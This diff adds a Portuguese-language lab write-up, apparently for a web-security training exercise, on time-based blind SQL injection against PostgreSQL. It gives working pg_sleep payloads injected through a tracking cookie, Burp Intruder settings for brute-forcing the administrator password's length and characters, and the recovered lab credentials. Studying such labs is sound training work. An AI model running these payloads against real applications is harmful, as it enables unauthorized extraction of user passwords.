@@ -1,0 +1,112 @@
+___________________________________________________________________
+\\Blind SQL injection with time delays and information retrieval//
+-------------------------------------------------------------------
+
+Vamos interceptar com o burp
+
+Vamos faezr uma injeção igual fizemos no laboratório anterior.
+
+' || (SELECT pg_sleep(10))--
+
+-------------------------------------------------------------------
+
+Vamos descobrir informações como o password do usuário 'administrator'
+
+Vamos verificar se existe algum usuário com o username='administrator'
+
+Injeção: ' || (SELECT pg_sleep(10) FROM users WHERE username='administrator')--
+
+Explicação: Caso tenha um usuario com o nome administrator a query vai devolver o resultado da função pg_sleep(10).
+            A aplicação vai demorar 10 segundos. Caso contrário não vai esperar este tempo.
+
+Espera 10s
+----------
+EX: Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator')--;
+
+Não espera 10s
+---------------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='a')--;
+
+--------------------------------------------------------------------------------------------------
+
+Vamos descobrir o número de caracteres da respectiva password
+
+Injeção: ' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)>1)-- 
+
+Explicação: Define o delay se o password ter tamanho superior a 1. Caso não tenha, a query devolve o resultado
+            quase instantâneamente
+
+Espera 10s
+-----------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)>5)--;
+
+Espera 10s
+-----------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)>10)--;
+
+Não Espera 
+----------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)>21)--;
+
+Não espera
+----------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)=21)--;
+
+Espera 10s
+-----------
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)=20)--;
+
+VAMOS UTILIZAR O INTRUDER
+
+Enviar requisição para intruder
+Limpar
+
+Add
+Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(5) FROM users WHERE username='administrator' AND LENGTH(password)=§21§)--; 
+
+Na list adicionar valor de 1-30
+
+No Resource Pool Vamos em:
+
+create new resource pool
+    nome = 1repeticao_de_cada_vez
+    maximum concurrent requests = 1
+
+>>start attack<<
+
+Vamos marcar na parte supeiror do attaque - response completed > Para ver o tempo gasto pela requisição.
+
+--------------------------------------------------------------------------------------------------------
+
+Agora que sabemos o tamanho da password, vamos descobrir o tamanho da respectiva password.
+
+Injeção: ' || (SELECT pg_sleep(5) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')--
+
+Explicação: Se o primeiro caracter do password for 'a' a query vai devolver o resultado da função pg_sleep(10)
+            caso contrário a aplicação vai devolver a resposta quase instantâneamente.
+
+Positions: 
+    clear
+    add  
+    Cookie: TrackingId=wXqfSotVZ6g2GRgA' || (SELECT pg_sleep(5) FROM users WHERE username='administrator' AND SUBSTRING(password,§1§,1)='§a§')--
+
+Posições do payload:
+    payload 1: 1-20
+    payload 2: 0-9 a-z
+
+Configurar Intruder
+    Position:
+        Attack Type: Cluster Bomb
+    Payloads: 
+        Payload Set: 1
+            1-20
+        Payload Set: 2 
+            0-9 a-z
+    Resource Pool: 
+        Create new resource pool:
+            name: 1repeticao_de_cada_vez
+            maxximum concurrent delay: 1
+
+username = administrator
+password = 3cjcda3lapa38r6wy3vj
+
